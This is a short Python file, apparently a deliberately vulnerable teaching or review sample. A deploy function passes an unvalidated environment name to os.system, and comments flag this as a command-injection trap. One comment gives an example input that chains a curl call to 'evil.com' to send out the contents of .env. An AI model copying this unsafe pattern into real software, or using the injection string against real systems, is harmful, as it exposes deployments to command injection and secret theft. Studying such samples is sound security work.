import os
import sys

def deploy_to_environment(env_name, version):
    """
    Deploys the application to a specific environment.
    The version is validated to be a semantic version string.
    """
    # Simple semver validation
    if not all(c.isdigit() or c == '.' for c in version):
        print("Invalid version format")
        return False

    # CROSS-DOMAIN BUG: env_name is expected to be 'prod' or 'staging'.
    # The Python logic doesn't strictly validate it because it's assumed to be 
    # safe or from a trusted source.
    # Trap: os.system() passes the string directly to the shell.
    # If env_name is "staging; curl http://evil.com/leak?key=$(cat .env)", 
    # it leads to command injection.
    
    print(f"Deploying version {version} to {env_name}...")
    
    command = f"./deploy.sh --env={env_name} --version={version}"
    exit_code = os.system(command)
    
    return exit_code == 0
